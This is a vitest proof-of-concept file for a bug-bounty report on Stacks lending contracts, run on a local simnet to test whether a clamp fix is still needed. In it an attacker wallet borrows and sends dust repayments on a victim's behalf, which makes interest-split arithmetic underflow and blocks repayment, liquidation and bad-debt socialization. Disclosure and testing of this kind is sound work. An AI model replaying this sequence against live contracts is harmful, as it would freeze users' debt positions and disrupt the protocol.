// Immunefi 97176 - unclamped proportional interest split underflows immutable state-v1.
//
// This file runs against a build of current master (repo contracts deployed into a local
// simnet), NOT against live state. It answers one question: does the clamp still have to
// ship in the held republish? The live-fork reproduction is in 97176.test.ts.

import { beforeEach, describe, expect, it } from "vitest";
import { Cl, contractPrincipalCV } from "@stacks/transactions";
import { tx } from "@stacks/clarinet-sdk";
import {
  add_collateral,
  borrow,
  deposit,
  initialize_ir,
  initialize_lp,
  initialize_staking,
  initialize_staking_reward,
  mint_token,
  set_allowed_contracts,
  set_asset_cap,
  update_supported_collateral,
} from "../tests/utils";
import {
  build_price_update,
  init_pyth,
  set_initial_price,
  set_price,
  set_price_without_scaling,
  set_pyth_time_delta,
} from "../tests/pyth";

const accounts = simnet.getAccounts();
const deployer = accounts.get("deployer")!;
const victim = accounts.get("wallet_1")!;
const attacker = accounts.get("wallet_2")!;
const liquidator = accounts.get("wallet_3")!;
const depositor = accounts.get("wallet_4")!;
const btc = contractPrincipalCV(deployer, "mock-btc");

const PROTOCOL_RESERVE_PERCENTAGE = 25_000_000n; // 25%

const dustRepayments = (count: number) =>
  Array.from({ length: count }, () =>
    tx.callPublicFn("borrower-v1", "repay", [Cl.uint(1), Cl.some(Cl.principal(victim))], attacker)
  );

describe("Immunefi 97176 on master - unclamped interest split underflows state-v1", () => {
  beforeEach(async () => {
    init_pyth(deployer);
    set_pyth_time_delta(7200, deployer);
    set_allowed_contracts(deployer);
    set_asset_cap(deployer, 100_000_000_000_000n);
    initialize_ir(deployer);
    initialize_staking_reward(deployer);
    initialize_lp(deployer);
    await set_initial_price("mock-usdc", 1n, deployer);
    await set_initial_price("mock-btc", 1n, deployer);
    const reserve = simnet.callPublicFn(
      "state-v1",
      "set-protocol-reserve-percentage",
      [Cl.uint(PROTOCOL_RESERVE_PERCENTAGE)],
      deployer
    );
    expect(reserve.result).toBeOk(Cl.bool(true));

    mint_token("mock-usdc", 100_000_000_000, depositor);
    deposit(100_000_000_000, depositor);
    initialize_staking(deployer);
    expect(
      simnet.callPublicFn("staking-v1", "stake", [Cl.uint(5_000_000_000)], depositor).result
    ).toBeOk(Cl.bool(true));

    update_supported_collateral("mock-btc", 80_000_000, 90_000_000, 10_000_000, 8, deployer);
  });

  it("control: the same full repayment succeeds without the dust repayments", async () => {
    mint_token("mock-btc", 20_000_000, victim);
    add_collateral("mock-btc", 20_000_000, deployer, victim);
    borrow(10_000_000, victim);
    simnet.mineEmptyBlocks(500);
    await set_price("mock-usdc", 1n, deployer);
    await set_price("mock-btc", 1n, deployer);
    mint_token("mock-usdc", 20_000_000, victim);
    const r = simnet.callPublicFn("borrower-v1", "repay", [Cl.uint(20_000_000), Cl.none()], victim);
    console.log("CONTROL repay (no dust):", JSON.stringify(r.result));
    expect(r.result).toBeOk(Cl.bool(true));
  });

  it("leg 1: repay underflows in state-v1::update-repay-state", async () => {
    mint_token("mock-btc", 20_000_000, victim);
    add_collateral("mock-btc", 20_000_000, deployer, victim);
    borrow(10_000_000, victim);

    simnet.mineEmptyBlocks(500);
    await set_price("mock-usdc", 1n, deployer);
    await set_price("mock-btc", 1n, deployer);

    mint_token("mock-btc", 20_000_000, attacker);
    add_collateral("mock-btc", 20_000_000, deployer, attacker);
    mint_token("mock-usdc", 100, attacker);
    mint_token("mock-usdc", 20_000_000, victim);

    const block = simnet.mineBlock([
      tx.callPublicFn(
        "borrower-v1",
        "borrow",
        [Cl.buffer(build_price_update()), Cl.uint(10_000_000), Cl.none()],
        attacker
      ),
      ...dustRepayments(12),
    ]);
    for (const res of block) expect(res.result).toBeOk(Cl.bool(true));

    const bucketsBefore = simnet.callReadOnlyFn("state-v1", "get-open-interest", [], deployer).result;
    console.log("BUCKETS BEFORE REPAY:", JSON.stringify(bucketsBefore));
    expect(() =>
      simnet.callPublicFn("borrower-v1", "repay", [Cl.uint(20_000_000), Cl.none()], victim)
    ).toThrow(/ArithmeticUnderflow[\s\S]*state-v1:update-repay-state/);
  });

  it("leg 2: full liquidation underflows in state-v1::update-liquidate-collateral-state", async () => {
    mint_token("mock-btc", 15_000_000, victim);
    add_collateral("mock-btc", 15_000_000, deployer, victim);
    borrow(10_000_000, victim);

    simnet.mineEmptyBlocks(500);
    await set_price("mock-usdc", 1n, deployer);
    await set_price("mock-btc", 1n, deployer);

    mint_token("mock-btc", 20_000_000, attacker);
    add_collateral("mock-btc", 20_000_000, deployer, attacker);
    mint_token("mock-usdc", 100, attacker);

    const block = simnet.mineBlock([
      tx.callPublicFn(
        "borrower-v1",
        "borrow",
        [Cl.buffer(build_price_update()), Cl.uint(10_000_000), Cl.none()],
        attacker
      ),
      ...dustRepayments(12),
    ]);
    for (const res of block) expect(res.result).toBeOk(Cl.bool(true));

    await set_price_without_scaling("mock-btc", 73_542_794n, deployer);
    mint_token("mock-usdc", 20_000_000, liquidator);

    expect(() =>
      simnet.callPublicFn(
        "liquidator-v1",
        "liquidate-collateral",
        [Cl.buffer(build_price_update()), btc, Cl.principal(victim), Cl.uint(20_000_000), Cl.uint(0)],
        liquidator
      )
    ).toThrow(/ArithmeticUnderflow[\s\S]*state-v1:update-liquidate-collateral-state/);
  });

  it("leg 3: bad-debt socialization underflows in state-v1::socialize-user-bad-debt", async () => {
    mint_token("mock-btc", 15_000_000, victim);
    add_collateral("mock-btc", 15_000_000, deployer, victim);
    borrow(10_000_000, victim);

    simnet.mineEmptyBlocks(500);
    await set_price("mock-usdc", 1n, deployer);
    await set_price("mock-btc", 1n, deployer);

    mint_token("mock-btc", 20_000_000, attacker);
    add_collateral("mock-btc", 20_000_000, deployer, attacker);
    mint_token("mock-usdc", 100, attacker);

    const block = simnet.mineBlock([
      tx.callPublicFn(
        "borrower-v1",
        "borrow",
        [Cl.buffer(build_price_update()), Cl.uint(10_000_000), Cl.none()],
        attacker
      ),
      ...dustRepayments(12),
    ]);
    for (const res of block) expect(res.result).toBeOk(Cl.bool(true));

    await set_price_without_scaling("mock-btc", 10_000_000n, deployer);
    mint_token("mock-usdc", 20_000_000, liquidator);

    expect(() =>
      simnet.callPublicFn(
        "liquidator-v1",
        "liquidate-collateral",
        [Cl.buffer(build_price_update()), btc, Cl.principal(victim), Cl.uint(20_000_000), Cl.uint(0)],
        liquidator
      )
    ).toThrow(/ArithmeticUnderflow[\s\S]*state-v1:socialize-user-bad-debt/);
  });
});
